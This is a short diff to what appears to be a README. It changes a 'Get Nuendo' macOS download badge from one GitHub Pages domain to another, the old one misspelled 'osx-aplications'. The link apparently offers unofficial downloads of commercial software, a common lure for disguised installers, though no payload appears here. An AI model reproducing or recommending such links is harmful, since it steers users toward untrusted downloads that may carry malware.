@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/nuendo">
+  <a href="https://osx-quick-app.github.io/.github/nuendo">
     <img src="https://img.shields.io/badge/Get%20Nuendo-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Nuendo">
   </a>
 </p>
